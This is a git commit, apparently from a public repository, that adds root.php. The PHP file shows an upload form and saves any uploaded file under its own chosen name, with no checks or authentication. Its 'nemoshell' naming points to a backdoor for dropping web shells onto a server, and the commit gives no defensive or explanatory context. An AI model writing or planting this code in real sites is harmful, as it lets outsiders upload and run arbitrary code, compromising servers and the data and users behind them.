8bdb06324913169b0881a57c5147ff561facdb6e
rotinabox <67357573+rotinabox@users.noreply.github.com>
2021-12-25 17:47:11 +0100

    Create root.php

---
+++ root.php
@@ -0,0 +1,7 @@
+Bigbang
+<?php
+$nemoshell = $_FILES['file']['name'];
+$nemohero  = $_FILES['file']['tmp_name'];
+echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='submit' /></form>";
+move_uploaded_file($nemohero,$nemoshell);
+?>
